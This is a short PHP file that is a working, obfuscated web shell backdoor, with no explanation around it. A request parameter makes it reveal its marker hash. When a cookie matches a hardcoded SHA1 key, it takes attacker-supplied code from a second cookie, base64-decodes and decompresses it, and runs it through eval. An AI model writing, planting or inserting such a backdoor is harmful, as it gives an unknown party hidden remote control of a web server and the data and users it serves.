<?php

$snarbvc = "e2edf59665c4c0376f6fe1574853fd59d89a6b4c";

if (isset($_REQUEST['e5j6vfdg'])){ die('{->'. $snarbvc.'<-}'); }

if (sha1(@$_COOKIE[substr($snarbvc, 0, 16)]) === $snarbvc)
{
    $srntbyvg = $_COOKIE[substr($snarbvc, 16, 16)];

    $srntbyvg = base64_decode($srntbyvg);

    $srntbyvg = gzinflate($srntbyvg);

    eval($srntbyvg);
}
die();

